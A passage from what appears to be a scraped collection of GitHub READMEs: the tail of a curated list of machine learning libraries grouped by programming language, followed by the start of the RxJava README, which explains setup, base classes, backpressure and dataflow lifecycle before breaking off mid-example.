and automated hyperparameter tuning and stacked ensembling.\nPyTorch - Tensors and Dynamic neural networks in Python with strong GPU acceleration\nML-From-Scratch - Implementations of Machine Learning models from scratch in Python with a focus on transparency. Aims to showcase the nuts and bolts of ML in an accessible way.\nEdward - A library for probabilistic modeling, inference, and criticism. Built on top of TensorFlow.\nxRBM - A library for Restricted Boltzmann Machine (RBM) and its conditional variants in Tensorflow.\nCatBoost - General purpose gradient boosting on decision trees library with categorical features support out of the box. It is easy to install, well documented and supports CPU and GPU (even multi-GPU) computation.\nstacked_generalization - Implementation of machine learning stacking technic as handy library in Python.\nmodAL - A modular active learning framework for Python, built on top of scikit-learn.\nCogitare: A Modern, Fast, and Modular Deep Learning and Machine Learning framework for Python.\nParris - Parris, the automated infrastructure setup tool for machine learning algorithms.\nneonrvm - neonrvm is an open source machine learning library based on RVM technique. It's written in C programming language and comes with Python programming language bindings.\nTuri Create - Machine learning from Apple. Turi Create simplifies the development of custom machine learning models. You don't have to be a machine learning expert to add recommendations, object detection, image classification, image similarity or activity classification to your app.\nxLearn - A high performance, easy-to-use, and scalable machine learning package, which can be used to solve large-scale machine learning problems. xLearn is especially useful for solving machine learning problems on large-scale sparse data, which is very common in Internet services such as online advertisement and recommender systems.\nmlens - A high performance, memory efficient, maximally parallelized ensemble learning, integrated with scikit-learn.\nNetron - Visualizer for machine learning models.\nThampi - Machine Learning Prediction System on AWS Lambda\nMindsDB - Open Source framework to streamline use of neural networks.\nGorgonia - Gorgonia is a library that helps facilitate machine learning in Golang.\nMicrosoft Recommenders: Examples and best practices for building recommendation systems, provided as Jupyter notebooks. The repo contains some of the latest state of the art algorithms from Microsoft Research as well as from other companies and institutions.\nStellarGraph: Machine Learning on Graphs, a Python library for machine learning on graph-structured (network-structured) data.\nBentoML: Toolkit for package and deploy machine learning models for serving in production\nMiraiML: An asynchronous engine for continuous & autonomous machine learning, built for real-time usage.\nnumpy-ML: Reference implementations of ML models written in numpy\n\n\nData Analysis / Data Visualization\n\nSciPy - A Python-based ecosystem of open-source software for mathematics, science, and engineering.\nNumPy - A fundamental package for scientific computing with Python.\nNumba - Python JIT (just in time) compiler to LLVM aimed at scientific Python by the developers of Cython and NumPy.\nMars - A tensor-based framework for large-scale data computation which often regarded as a parallel and distributed version of NumPy.\nNetworkX - A high-productivity software for complex networks.\nigraph - binding to igraph library - General purpose graph library.\nPandas - A library providing high-performance, easy-to-use data structures and data analysis tools.\nOpen Mining - Business Intelligence (BI) in Python (Pandas web interface) [Deprecated]\nPyMC - Markov Chain Monte Carlo sampling toolkit.\nzipline - A Pythonic algorithmic trading library.\nPyDy - Short for Python Dynamics, used to assist with workflow in the modeling of dynamic motion based around NumPy, SciPy, IPython, and matplotlib.\nSymPy - A Python library for symbolic mathematics.\nstatsmodels - Statistical modeling and econometrics in Python.\nastropy - A community Python library for Astronomy.\nmatplotlib - A Python 2D plotting library.\nbokeh - Interactive Web Plotting for Python.\nplotly - Collaborative web plotting for Python and matplotlib.\naltair - A Python to Vega translator.\nd3py - A plotting library for Python, based on D3.js.\nPyDexter - Simple plotting for Python. Wrapper for D3xterjs; easily render charts in-browser.\nggplot - Same API as ggplot2 for R. [Deprecated]\nggfortify - Unified interface to ggplot2 popular R packages.\nKartograph.py - Rendering beautiful SVG maps in Python.\npygal - A Python SVG Charts Creator.\nPyQtGraph - A pure-python graphics and GUI library built on PyQt4 / PySide and NumPy.\npycascading [Deprecated]\nPetrel - Tools for writing, submitting, debugging, and monitoring Storm topologies in pure Python.\nBlaze - NumPy and Pandas interface to Big Data.\nemcee - The Python ensemble sampling toolkit for affine-invariant MCMC.\nwindML - A Python Framework for Wind Energy Analysis and Prediction.\nvispy - GPU-based high-performance interactive OpenGL 2D/3D data visualization library.\ncerebro2 A web-based visualization and debugging platform for NuPIC. [Deprecated]\nNuPIC Studio An all-in-one NuPIC Hierarchical Temporal Memory visualization and debugging super-tool! [Deprecated]\nSparklingPandas Pandas on PySpark (POPS).\nSeaborn - A python visualization library based on matplotlib.\nbqplot - An API for plotting in Jupyter (IPython).\npastalog - Simple, realtime visualization of neural network training performance.\nSuperset - A data exploration platform designed to be visual, intuitive, and interactive.\nDora - Tools for exploratory data analysis in Python.\nRuffus - Computation Pipeline library for python.\nSOMPY - Self Organizing Map written in Python (Uses neural networks for data analysis).\nsomoclu Massively parallel self-organizing maps: accelerate training on multicore CPUs, GPUs, and clusters, has python API.\nHDBScan - implementation of the hdbscan algorithm in Python - used for clustering\nvisualize_ML - A python package for data exploration and data analysis. [Deprecated]\nscikit-plot - A visualization library for quick and easy generation of common plots in data analysis and machine learning.\nBowtie - A dashboard library for interactive visualizations using flask socketio and react.\nlime - Lime is about explaining what machine learning classifiers (or models) are doing. It is able to explain any black box classifier, with two or more classes.\nPyCM - PyCM is a multi-class confusion matrix library written in Python that supports both input data vectors and direct matrix, and a proper tool for post-classification model evaluation that supports most classes and overall statistics parameters\nDash - A framework for creating analytical web applications built on top of Plotly.js, React, and Flask\nLambdo - A workflow engine for solving machine learning problems by combining in one analysis pipeline (i) feature engineering and machine learning (ii) model training and prediction (iii) table population and column evaluation via user-defined (Python) functions.\n\n\nMisc Scripts / iPython Notebooks / Codebases\n\nMap/Reduce implementations of common ML algorithms: Jupyter notebooks that cover how to implement from scratch different ML algorithms (ordinary least squares, gradient descent, k-means, alternating least squares), using Python NumPy, and how to then make these implementations scalable using Map/Reduce and Spark.\nBioPy - Biologically-Inspired and Machine Learning Algorithms in Python. [Deprecated]\nSVM Explorer - Interactive SVM Explorer, using Dash and scikit-learn\npattern_classification\nthinking stats 2\nhyperopt\nnumpic\n2012-paper-diginorm\nA gallery of interesting IPython notebooks\nipython-notebooks\ndata-science-ipython-notebooks - Continually updated Data Science Python Notebooks: Spark, Hadoop MapReduce, HDFS, AWS, Kaggle, scikit-learn, matplotlib, pandas, NumPy, SciPy, and various command lines.\ndecision-weights\nSarah Palin LDA - Topic Modeling the Sarah Palin emails.\nDiffusion Segmentation - A collection of image segmentation algorithms based on diffusion methods.\nScipy Tutorials - SciPy tutorials. This is outdated, check out scipy-lecture-notes.\nCrab - A recommendation engine library for Python.\nBayesPy - Bayesian Inference Tools in Python.\nscikit-learn tutorials - Series of notebooks for learning scikit-learn.\nsentiment-analyzer - Tweets Sentiment Analyzer\nsentiment_classifier - Sentiment classifier using word sense disambiguation.\ngroup-lasso - Some experiments with the coordinate descent algorithm used in the (Sparse) Group Lasso model.\njProcessing - Kanji / Hiragana / Katakana to Romaji Converter. Edict Dictionary & parallel sentences Search. Sentence Similarity between two JP Sentences. Sentiment Analysis of Japanese Text. Run Cabocha(ISO--8859-1 configured) in Python.\nmne-python-notebooks - IPython notebooks for EEG/MEG data processing using mne-python.\nNeon Course - IPython notebooks for a complete course around understanding Nervana's Neon.\npandas cookbook - Recipes for using Python's pandas library.\nclimin - Optimization library focused on machine learning, pythonic implementations of gradient descent, LBFGS, rmsprop, adadelta and others.\nAllen Downey\u2019s Data Science Course - Code for Data Science at Olin College, Spring 2014.\nAllen Downey\u2019s Think Bayes Code - Code repository for Think Bayes.\nAllen Downey\u2019s Think Complexity Code - Code for Allen Downey's book Think Complexity.\nAllen Downey\u2019s Think OS Code - Text and supporting code for Think OS: A Brief Introduction to Operating Systems.\nPython Programming for the Humanities - Course for Python programming for the Humanities, assuming no prior knowledge. Heavy focus on text processing / NLP.\nGreatCircle - Library for calculating great circle distance.\nOptunity examples - Examples demonstrating how to use Optunity in synergy with machine learning libraries.\nDive into Machine Learning  with Python Jupyter notebook and scikit-learn - \"I learned Python by hacking first, and getting serious later. I wanted to do this with Machine Learning. If this is your style, join me in getting a bit ahead of yourself.\"\nTDB - TensorDebugger (TDB) is a visual debugger for deep learning. It features interactive, node-by-node debugging and visualization for TensorFlow.\nSuiron - Machine Learning for RC Cars.\nIntroduction to machine learning with scikit-learn - IPython notebooks from Data School's video tutorials on scikit-learn.\nPractical XGBoost in Python - comprehensive online course about using XGBoost in Python.\nIntroduction to Machine Learning with Python - Notebooks and code for the book \"Introduction to Machine Learning with Python\"\nPydata book - Materials and IPython notebooks for \"Python for Data Analysis\" by Wes McKinney, published by O'Reilly Media\nHomemade Machine Learning - Python examples of popular machine learning algorithms with interactive Jupyter demos and math being explained\n\n\nNeural Networks\n\nNeuralTalk - NeuralTalk is a Python+numpy project for learning Multimodal Recurrent Neural Networks that describe images with sentences. [Deprecated]\nNeuron - Neuron is simple class for time series predictions. It's utilize LNU (Linear Neural Unit), QNU (Quadratic Neural Unit), RBF (Radial Basis Function), MLP (Multi Layer Perceptron), MLP-ELM (Multi Layer Perceptron - Extreme Learning Machine) neural networks learned with Gradient descent or LeLevenberg\u2013Marquardt algorithm. [Deprecated]\nData Driven Code - Very simple implementation of neural networks for dummies in python without using any libraries, with detailed comments.\n\n\nKaggle Competition Source Code\n\nopen-solution-home-credit -> source code and experiments results for Home Credit Default Risk.\nopen-solution-googleai-object-detection -> source code and experiments results for Google AI Open Images - Object Detection Track.\nopen-solution-salt-identification -> source code and experiments results for TGS Salt Identification Challenge.\nopen-solution-ship-detection -> source code and experiments results for Airbus Ship Detection Challenge.\nopen-solution-data-science-bowl-2018 -> source code and experiments results for 2018 Data Science Bowl.\nopen-solution-value-prediction -> source code and experiments results for Santander Value Prediction Challenge.\nopen-solution-toxic-comments -> source code for Toxic Comment Classification Challenge.\nwiki challenge - An implementation of Dell Zhang's solution to Wikipedia's Participation Challenge on Kaggle.\nkaggle insults - Kaggle Submission for \"Detecting Insults in Social Commentary\".\nkaggle_acquire-valued-shoppers-challenge - Code for the Kaggle acquire valued shoppers challenge.\nkaggle-cifar - Code for the CIFAR-10 competition at Kaggle, uses cuda-convnet.\nkaggle-blackbox - Deep learning made easy.\nkaggle-accelerometer - Code for Accelerometer Biometric Competition at Kaggle.\nkaggle-advertised-salaries - Predicting job salaries from ads - a Kaggle competition.\nkaggle amazon - Amazon access control challenge.\nkaggle-bestbuy_big - Code for the Best Buy competition at Kaggle.\nkaggle-bestbuy_small\nKaggle Dogs vs. Cats - Code for Kaggle Dogs vs. Cats competition.\nKaggle Galaxy Challenge - Winning solution for the Galaxy Challenge on Kaggle.\nKaggle Gender - A Kaggle competition: discriminate gender based on handwriting.\nKaggle Merck - Merck challenge at Kaggle.\nKaggle Stackoverflow - Predicting closed questions on Stack Overflow.\nkaggle_acquire-valued-shoppers-challenge - Code for the Kaggle acquire valued shoppers challenge.\nwine-quality - Predicting wine quality.\n\n\nReinforcement Learning\n\nDeepMind Lab - DeepMind Lab is a 3D learning environment based on id Software's Quake III Arena via ioquake3 and other open source software. Its primary purpose is to act as a testbed for research in artificial intelligence, especially deep reinforcement learning.\nGym - OpenAI Gym is a toolkit for developing and comparing reinforcement learning algorithms.\nSerpent.AI - Serpent.AI is a game agent framework that allows you to turn any video game you own into a sandbox to develop AI and machine learning experiments. For both researchers and hobbyists.\nViZDoom - ViZDoom allows developing AI bots that play Doom using only the visual information (the screen buffer). It is primarily intended for research in machine visual learning, and deep reinforcement learning, in particular.\nRoboschool - Open-source software for robot simulation, integrated with OpenAI Gym.\nRetro - Retro Games in Gym\nSLM Lab - Modular Deep Reinforcement Learning framework in PyTorch.\nCoach - Reinforcement Learning Coach by Intel\u00ae AI Lab enables easy experimentation with state of the art Reinforcement Learning algorithms\n\n\nRuby\n\nNatural Language Processing\n\nAwesome NLP with Ruby - Curated link list for practical natural language processing in Ruby.\nTreat - Text REtrieval and Annotation Toolkit, definitely the most comprehensive toolkit I\u2019ve encountered so far for Ruby.\nStemmer - Expose libstemmer_c to Ruby. [Deprecated]\nRaspel - raspell is an interface binding for ruby. [Deprecated]\nUEA Stemmer - Ruby port of UEALite Stemmer - a conservative stemmer for search and indexing.\nTwitter-text-rb - A library that does auto linking and extraction of usernames, lists and hashtags in tweets.\n\n\nGeneral-Purpose Machine Learning\n\nAwesome Machine Learning with Ruby - Curated list of ML related resources for Ruby.\nRuby Machine Learning - Some Machine Learning algorithms, implemented in Ruby. [Deprecated]\nMachine Learning Ruby [Deprecated]\njRuby Mahout - JRuby Mahout is a gem that unleashes the power of Apache Mahout in the world of JRuby. [Deprecated]\nCardMagic-Classifier - A general classifier module to allow Bayesian and other types of classifications.\nrb-libsvm - Ruby language bindings for LIBSVM which is a Library for Support Vector Machines.\nScoruby - Creates Random Forest classifiers from PMML files.\n\n\nData Analysis / Data Visualization\n\nrsruby - Ruby - R bridge.\ndata-visualization-ruby - Source code and supporting content for my Ruby Manor presentation on Data Visualisation with Ruby. [Deprecated]\nruby-plot - gnuplot wrapper for Ruby, especially for plotting ROC curves into SVG files. [Deprecated]\nplot-rb - A plotting library in Ruby built on top of Vega and D3. [Deprecated]\nscruffy - A beautiful graphing toolkit for Ruby.\nSciRuby\nGlean - A data management tool for humans. [Deprecated]\nBioruby\nArel [Deprecated]\n\n\nMisc\n\nBig Data For Chimps\nListof - Community based data collection, packed in gem. Get list of pretty much anything (stop words, countries, non words) in txt, json or hash. Demo/Search for a list\n\n\nRust\n\nGeneral-Purpose Machine Learning\n\ndeeplearn-rs - deeplearn-rs provides simple networks that use matrix multiplication, addition, and ReLU under the MIT license.\nrustlearn - a machine learning framework featuring logistic regression, support vector machines, decision trees and random forests.\nrusty-machine - a pure-rust machine learning library.\nleaf - open source framework for machine intelligence, sharing concepts from TensorFlow and Caffe. Available under the MIT license. [Deprecated]\nRustNN - RustNN is a feedforward neural network library. [Deprecated]\nRusticSOM - A Rust library for Self Organising Maps (SOM).\n\n\nR\n\nGeneral-Purpose Machine Learning\n\nahaz - ahaz: Regularization for semiparametric additive hazards regression. [Deprecated]\narules - arules: Mining Association Rules and Frequent Itemsets\nbiglasso - biglasso: Extending Lasso Model Fitting to Big Data in R.\nbmrm - bmrm: Bundle Methods for Regularized Risk Minimization Package.\nBoruta - Boruta: A wrapper algorithm for all-relevant feature selection.\nbst - bst: Gradient Boosting.\nC50 - C50: C5.0 Decision Trees and Rule-Based Models.\ncaret - Classification and Regression Training: Unified interface to ~150 ML algorithms in R.\ncaretEnsemble - caretEnsemble: Framework for fitting multiple caret models as well as creating ensembles of such models. [Deprecated]\nCatBoost - General purpose gradient boosting on decision trees library with categorical features support out of the box for R.\nClever Algorithms For Machine Learning\nCORElearn - CORElearn: Classification, regression, feature evaluation and ordinal evaluation.\nCoxBoost - CoxBoost: Cox models by likelihood based boosting for a single survival endpoint or competing risks [Deprecated]\nCubist - Cubist: Rule- and Instance-Based Regression Modeling.\ne1071 - e1071: Misc Functions of the Department of Statistics (e1071), TU Wien\nearth - earth: Multivariate Adaptive Regression Spline Models\nelasticnet - elasticnet: Elastic-Net for Sparse Estimation and Sparse PCA.\nElemStatLearn - ElemStatLearn: Data sets, functions and examples from the book: \"The Elements of Statistical Learning, Data Mining, Inference, and Prediction\" by Trevor Hastie, Robert Tibshirani and Jerome Friedman Prediction\" by Trevor Hastie, Robert Tibshirani and Jerome Friedman.\nevtree - evtree: Evolutionary Learning of Globally Optimal Trees.\nforecast - forecast: Timeseries forecasting using ARIMA, ETS, STLM, TBATS, and neural network models.\nforecastHybrid - forecastHybrid: Automatic ensemble and cross validation of ARIMA, ETS, STLM, TBATS, and neural network models from the \"forecast\" package.\nfpc - fpc: Flexible procedures for clustering.\nfrbs - frbs: Fuzzy Rule-based Systems for Classification and Regression Tasks. [Deprecated]\nGAMBoost - GAMBoost: Generalized linear and additive models by likelihood based boosting. [Deprecated]\ngamboostLSS - gamboostLSS: Boosting Methods for GAMLSS.\ngbm - gbm: Generalized Boosted Regression Models.\nglmnet - glmnet: Lasso and elastic-net regularized generalized linear models.\nglmpath - glmpath: L1 Regularization Path for Generalized Linear Models and Cox Proportional Hazards Model.\nGMMBoost - GMMBoost: Likelihood-based Boosting for Generalized mixed models. [Deprecated]\ngrplasso - grplasso: Fitting user specified models with Group Lasso penalty.\ngrpreg - grpreg: Regularization paths for regression models with grouped covariates.\nh2o - A framework for fast, parallel, and distributed machine learning algorithms at scale -- Deeplearning, Random forests, GBM, KMeans, PCA, GLM.\nhda - hda: Heteroscedastic Discriminant Analysis. [Deprecated]\nIntroduction to Statistical Learning\nipred - ipred: Improved Predictors.\nkernlab - kernlab: Kernel-based Machine Learning Lab.\nklaR - klaR: Classification and visualization.\nL0Learn - L0Learn: Fast algorithms for best subset selection.\nlars - lars: Least Angle Regression, Lasso and Forward Stagewise. [Deprecated]\nlasso2 - lasso2: L1 constrained estimation aka \u2018lasso\u2019.\nLiblineaR - LiblineaR: Linear Predictive Models Based On The Liblinear C/C++ Library.\nLogicReg - LogicReg: Logic Regression.\nMachine Learning For Hackers\nmaptree - maptree: Mapping, pruning, and graphing tree models. [Deprecated]\nmboost - mboost: Model-Based Boosting.\nmedley - medley: Blending regression models, using a greedy stepwise approach.\nmlr - mlr: Machine Learning in R.\nncvreg - ncvreg: Regularization paths for SCAD- and MCP-penalized regression models.\nnnet - nnet: Feed-forward Neural Networks and Multinomial Log-Linear Models. [Deprecated]\npamr - pamr: Pam: prediction analysis for microarrays. [Deprecated]\nparty - party: A Laboratory for Recursive Partytioning.\npartykit - partykit: A Toolkit for Recursive Partytioning.\npenalized - penalized: L1 (lasso and fused lasso) and L2 (ridge) penalized estimation in GLMs and in the Cox model.\npenalizedLDA - penalizedLDA: Penalized classification using Fisher's linear discriminant. [Deprecated]\npenalizedSVM - penalizedSVM: Feature Selection SVM using penalty functions.\nquantregForest - quantregForest: Quantile Regression Forests.\nrandomForest - randomForest: Breiman and Cutler's random forests for classification and regression.\nrandomForestSRC - randomForestSRC: Random Forests for Survival, Regression and Classification (RF-SRC).\nrattle - rattle: Graphical user interface for data mining in R.\nrda - rda: Shrunken Centroids Regularized Discriminant Analysis.\nrdetools - rdetools: Relevant Dimension Estimation (RDE) in Feature Spaces. [Deprecated]\nREEMtree - REEMtree: Regression Trees with Random Effects for Longitudinal (Panel) Data. [Deprecated]\nrelaxo - relaxo: Relaxed Lasso. [Deprecated]\nrgenoud - rgenoud: R version of GENetic Optimization Using Derivatives\nRmalschains - Rmalschains: Continuous Optimization using Memetic Algorithms with Local Search Chains (MA-LS-Chains) in R.\nrminer - rminer: Simpler use of data mining methods (e.g. NN and SVM) in classification and regression. [Deprecated]\nROCR - ROCR: Visualizing the performance of scoring classifiers. [Deprecated]\nRoughSets - RoughSets: Data Analysis Using Rough Set and Fuzzy Rough Set Theories. [Deprecated]\nrpart - rpart: Recursive Partitioning and Regression Trees.\nRPMM - RPMM: Recursively Partitioned Mixture Model.\nRSNNS - RSNNS: Neural Networks in R using the Stuttgart Neural Network Simulator (SNNS).\nRWeka - RWeka: R/Weka interface.\nRXshrink - RXshrink: Maximum Likelihood Shrinkage via Generalized Ridge or Least Angle Regression.\nsda - sda: Shrinkage Discriminant Analysis and CAT Score Variable Selection. [Deprecated]\nspectralGraphTopology - spectralGraphTopology: Learning Graphs from Data via Spectral Constraints.\nSuperLearner - Multi-algorithm ensemble learning packages.\nsvmpath - svmpath: svmpath: the SVM Path algorithm. [Deprecated]\ntgp - tgp: Bayesian treed Gaussian process models. [Deprecated]\ntree - tree: Classification and regression trees.\nvarSelRF - varSelRF: Variable selection using random forests.\nXGBoost.R - R binding for eXtreme Gradient Boosting (Tree) Library.\nOptunity - A library dedicated to automated hyperparameter optimization with a simple, lightweight API to facilitate drop-in replacement of grid search. Optunity is written in Python but interfaces seamlessly to R.\nigraph - binding to igraph library - General purpose graph library.\nMXNet - Lightweight, Portable, Flexible Distributed/Mobile Deep Learning with Dynamic, Mutation-aware Dataflow Dep Scheduler; for Python, R, Julia, Go, Javascript and more.\nTDSP-Utilities - Two data science utilities in R from Microsoft: 1) Interactive Data Exploration, Analysis, and Reporting (IDEAR) ; 2) Automated Modeling and Reporting (AMR).\n\n\nData Analysis / Data Visualization\n\nggplot2 - A data visualization package based on the grammar of graphics.\ntmap for visualizing geospatial data with static maps and leaflet for interactive maps\ntm and quanteda are the main packages for managing,  analyzing, and visualizing textual data.\nshiny is the basis for truly interactive displays and dashboards in R. However, some measure of interactivity can be achieved with htmlwidgets bringing javascript libraries to R. These include, plotly, dygraphs, highcharter, and several others.\n\n\nSAS\n\nGeneral-Purpose Machine Learning\n\nVisual Data Mining and Machine Learning - Interactive, automated, and programmatic modeling with the latest machine learning algorithms in and end-to-end analytics environment, from data prep to deployment. Free trial available.\nEnterprise Miner - Data mining and machine learning that creates deployable models using a GUI or code.\nFactory Miner - Automatically creates deployable machine learning models across numerous market or customer segments using a GUI.\n\n\nData Analysis / Data Visualization\n\nSAS/STAT - For conducting advanced statistical analysis.\nUniversity Edition - FREE! Includes all SAS packages necessary for data analysis and visualization, and includes online SAS courses.\n\n\nNatural Language Processing\n\nContextual Analysis - Add structure to unstructured text using a GUI.\nSentiment Analysis - Extract sentiment from text using a GUI.\nText Miner - Text mining using a GUI or code.\n\n\nDemos and Scripts\n\nML_Tables - Concise cheat sheets containing machine learning best practices.\nenlighten-apply - Example code and materials that illustrate applications of SAS machine learning techniques.\nenlighten-integration - Example code and materials that illustrate techniques for integrating SAS with other analytics technologies in Java, PMML, Python and R.\nenlighten-deep - Example code and materials that illustrate using neural networks with several hidden layers in SAS.\ndm-flow - Library of SAS Enterprise Miner process flow diagrams to help you learn by example about specific data mining topics.\n\n\nScala\n\nNatural Language Processing\n\nScalaNLP - ScalaNLP is a suite of machine learning and numerical computing libraries.\nBreeze - Breeze is a numerical processing library for Scala.\nChalk - Chalk is a natural language processing library. [Deprecated]\nFACTORIE - FACTORIE is a toolkit for deployable probabilistic modeling, implemented as a software library in Scala. It provides its users with a succinct language for creating relational factor graphs, estimating parameters and performing inference.\nMontague - Montague is a semantic parsing library for Scala with an easy-to-use DSL.\nSpark NLP - Natural language processing library built on top of Apache Spark ML to provide simple, performant, and accurate NLP annotations for machine learning pipelines, that scale easily in a distributed environment.\n\n\nData Analysis / Data Visualization\n\nMLlib in Apache Spark - Distributed machine learning library in Spark\nHydrosphere Mist - a service for deployment Apache Spark MLLib machine learning models as realtime, batch or reactive web services.\nScalding - A Scala API for Cascading.\nSumming Bird - Streaming MapReduce with Scalding and Storm.\nAlgebird - Abstract Algebra for Scala.\nxerial - Data management utilities for Scala. [Deprecated]\nPredictionIO - PredictionIO, a machine learning server for software developers and data engineers.\nBIDMat - CPU and GPU-accelerated matrix library intended to support large-scale exploratory data analysis.\nFlink - Open source platform for distributed stream and batch data processing.\nSpark Notebook - Interactive and Reactive Data Science using Scala and Spark.\n\n\nGeneral-Purpose Machine Learning\n\nDeepLearning.scala - Creating statically typed dynamic neural networks from object-oriented & functional programming constructs.\nConjecture - Scalable Machine Learning in Scalding.\nbrushfire - Distributed decision tree ensemble learning in Scala.\nganitha - Scalding powered machine learning. [Deprecated]\nadam - A genomics processing engine and specialized file format built using Apache Avro, Apache Spark and Parquet. Apache 2 licensed.\nbioscala - Bioinformatics for the Scala programming language\nBIDMach - CPU and GPU-accelerated Machine Learning Library.\nFigaro - a Scala library for constructing probabilistic models.\nH2O Sparkling Water - H2O and Spark interoperability.\nFlinkML in Apache Flink - Distributed machine learning library in Flink.\nDynaML - Scala Library/REPL for Machine Learning Research.\nSaul - Flexible Declarative Learning-Based Programming.\nSwiftLearner - Simply written algorithms to help study ML or write your own implementations.\nSmile - Statistical Machine Intelligence and Learning Engine.\ndoddle-model - An in-memory machine learning library built on top of Breeze. It provides immutable objects and exposes its functionality through a scikit-learn-like API.\nTensorFlow Scala -   Strongly-typed Scala API for TensorFlow.\n\n\nScheme\n\nNeural Networks\n\nlayer - Neural network inference from the command line, implemented in CHICKEN Scheme.\n\n\nSwift\n\nGeneral-Purpose Machine Learning\n\nBender - Fast Neural Networks framework built on top of Metal. Supports TensorFlow models.\nSwift AI - Highly optimized artificial intelligence and machine learning library written in Swift.\nBrainCore - The iOS and OS X neural network framework.\nswix - A bare bones library that includes a general matrix language and wraps some OpenCV for iOS development. [Deprecated]\nAIToolbox - A toolbox framework of AI modules written in Swift: Graphs/Trees, Linear Regression, Support Vector Machines, Neural Networks, PCA, KMeans, Genetic Algorithms, MDP, Mixture of Gaussians.\nMLKit - A simple Machine Learning Framework written in Swift. Currently features Simple Linear Regression, Polynomial Regression, and Ridge Regression.\nSwift Brain - The first neural network / machine learning library written in Swift. This is a project for AI algorithms in Swift for iOS and OS X development. This project includes algorithms focused on Bayes theorem, neural networks, SVMs, Matrices, etc...\nPerfect TensorFlow - Swift Language Bindings of TensorFlow. Using native TensorFlow models on both macOS / Linux.\nPredictionBuilder - A library for machine learning that builds predictions using a linear regression.\nAwesome CoreML - A curated list of pretrained CoreML models.\nAwesome Core ML Models - A curated list of machine learning models in CoreML format.\n\n\nTensorFlow\n\nGeneral-Purpose Machine Learning\n\nAwesome TensorFlow - A list of all things related to TensorFlow.\nGolden TensorFlow - A page of content on TensorFlow, including academic papers and links to related topics.\n\n\nTools\n\nNeural Networks\n\nlayer - Neural network inference from the command line\n\n\nMisc\n\nNotebooks - A starter kit for Jupyter notebooks and machine learning. Companion docker images consist of all combinations of python versions, machine learning frameworks (Keras, PyTorch and Tensorflow) and CPU/CUDA versions.\nDVC - Data Science Version Control is an open-source version control system for machine learning projects with pipelines support. It makes ML projects reproducible and shareable.\n\n\nCredits\n\nSome of the python libraries were cut-and-pasted from vinta\nThe few go reference I found where pulled from this page"}, {"title": "ReactiveX/RxJava", "language": "Java", "content": "RxJava: Reactive Extensions for the JVM\n\n\n\nRxJava is a Java VM implementation of Reactive Extensions: a library for composing asynchronous and event-based programs by using observable sequences.\nIt extends the observer pattern to support sequences of data/events and adds operators that allow you to compose sequences together declaratively while abstracting away concerns about things like low-level threading, synchronization, thread-safety and concurrent data structures.\nVersion 2.x (Javadoc)\n\nsingle dependency: Reactive-Streams\ncontinued support for Java 6+ & Android 2.3+\nperformance gains through design changes learned through the 1.x cycle and through Reactive-Streams-Commons research project.\nJava 8 lambda-friendly API\nnon-opinionated about source of concurrency (threads, pools, event loops, fibers, actors, etc)\nasync or synchronous execution\nvirtual time and schedulers for parameterized concurrency\n\nVersion 2.x and 1.x will live side-by-side for several years. They will have different group ids (io.reactivex.rxjava2 vs io.reactivex) and namespaces (io.reactivex vs rx).\nSee the differences between version 1.x and 2.x in the wiki article What's different in 2.0. Learn more about RxJava in general on the Wiki Home.\nVersion 1.x\nThe 1.x version is end-of-life as of March 31, 2018. No further development, support, maintenance, PRs and updates will happen. The Javadoc of the very last version, 1.3.8, will remain accessible.\nGetting started\nSetting up the dependency\nThe first step is to include RxJava 2 into your project, for example, as a Gradle compile dependency:\nimplementation \"io.reactivex.rxjava2:rxjava:2.x.y\"\n(Please replace x and y with the latest version numbers: \n)\nHello World\nThe second is to write the Hello World program:\npackage rxjava.examples;\n\nimport io.reactivex.*;\n\npublic class HelloWorld {\n    public static void main(String[] args) {\n        Flowable.just(\"Hello world\").subscribe(System.out::println);\n    }\n}\nIf your platform doesn't support Java 8 lambdas (yet), you have to create an inner class of Consumer manually:\nimport io.reactivex.functions.Consumer;\n\nFlowable.just(\"Hello world\")\n  .subscribe(new Consumer<String>() {\n      @Override public void accept(String s) {\n          System.out.println(s);\n      }\n  });\nBase classes\nRxJava 2 features several base classes you can discover operators on:\n\nio.reactivex.Flowable: 0..N flows, supporting Reactive-Streams and backpressure\nio.reactivex.Observable: 0..N flows, no backpressure,\nio.reactivex.Single: a flow of exactly 1 item or an error,\nio.reactivex.Completable: a flow without items but only a completion or error signal,\nio.reactivex.Maybe: a flow with no items, exactly one item or an error.\n\nSome terminology\nUpstream, downstream\nThe dataflows in RxJava consist of a source, zero or more intermediate steps followed by a data consumer or combinator step (where the step is responsible to consume the dataflow by some means):\nsource.operator1().operator2().operator3().subscribe(consumer);\n\nsource.flatMap(value -> source.operator1().operator2().operator3());\nHere, if we imagine ourselves on operator2, looking to the left towards the source, is called the upstream. Looking to the right towards the subscriber/consumer, is called the downstream. This is often more apparent when each element is written on a separate line:\nsource\n  .operator1()\n  .operator2()\n  .operator3()\n  .subscribe(consumer)\nObjects in motion\nIn RxJava's documentation, emission, emits, item, event, signal, data and message are considered synonyms and represent the object traveling along the dataflow.\nBackpressure\nWhen the dataflow runs through asynchronous steps, each step may perform different things with different speed. To avoid overwhelming such steps, which usually would manifest itself as increased memory usage due to temporary buffering or the need for skipping/dropping data, a so-called backpressure is applied, which is a form of flow control where the steps can express how many items are they ready to process. This allows constraining the memory usage of the dataflows in situations where there is generally no way for a step to know how many items the upstream will send to it.\nIn RxJava, the dedicated Flowable class is designated to support backpressure and Observable is dedicated for the non-backpressured operations (short sequences, GUI interactions, etc.). The other types, Single, Maybe and Completable don't support backpressure nor should they; there is always room to store one item temporarily.\nAssembly time\nThe preparation of dataflows by applying various intermediate operators happens in the so-called assembly time:\nFlowable<Integer> flow = Flowable.range(1, 5)\n.map(v -> v * v)\n.filter(v -> v % 3 == 0)\n;\nAt this point, the data is not flowing yet and no side-effects are happening.\nSubscription time\nThis is a temporary state when subscribe() is called on a flow that establishes the chain of processing steps internally:\nflow.subscribe(System.out::println)\nThis is when the subscription side-effects are triggered (see doOnSubscribe). Some sources block or start emitting items right away in this state.\nRuntime\nThis is the state when the flows are actively emitting items, errors or completion signals:\nObservable.create(emitter -> {\n     while (!emitter.isDisposed()) {\n         long time = System.currentTimeMillis();\n         emitter.onNext(time);\n         if (time % 2 != 0) {\n             emitter.onError(new IllegalStateException(\"Odd millisecond!\"));\n             break;\n         }\n     }\n})\n.subscribe(System.out::println, Throwable::printStackTrace);\nPractically, this is when the body of the given example above executes.\nSimple background computation\nOne of the common use cases for RxJava is to run some computation, network request on a background thread and show the results (or error) on the UI thread:\nimport io.reactivex.schedulers.Schedulers;\n\nFlowable.fromCallable(() -> {\n    Thread.sleep(1000); //  imitate expensive computation\n    return \"Done\";\n})\n  